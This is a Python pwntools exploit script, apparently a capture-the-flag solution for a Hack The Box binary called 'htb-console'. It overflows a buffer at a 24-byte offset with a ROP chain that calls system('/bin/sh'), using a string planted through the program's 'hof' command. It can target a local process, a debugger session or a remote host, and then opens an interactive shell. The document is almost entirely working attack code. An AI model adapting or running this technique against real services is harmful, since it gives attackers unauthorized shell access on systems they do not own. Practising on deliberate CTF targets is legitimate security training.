#!/usr/bin/python3
# Author: Hack.You

from pwn import *
import warnings

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
break main
continue
'''.format(**locals())

# Binary filename
exe = './htb-console'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'info'
warnings.filterwarnings("ignore", category=BytesWarning, message="Text is not bytes; assuming ASCII, no guarantees.")

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
io = start()

offset = 24 

pop_rdi = 0x0000000000401473 # pop rdi; ret; 
hof = 0x4040b0

#payload = flat({
#    offset: [
#        pop_rdi,
#        hof,
#        elf.symbols['system']
#    ]
#})

rop = ROP(elf)
sh = hof
shell = rop.system(sh)
chain = rop.chain()
pprint(rop.dump())

payload = flat({
     offset: [
         chain
      ]
})

io.sendlineafter('>>', 'hof')
io.sendlineafter('Enter your name:', '/bin/sh')
io.sendlineafter('>>', 'flag')
io.recvuntil('Enter flag:')
io.sendline(payload)

io.interactive()
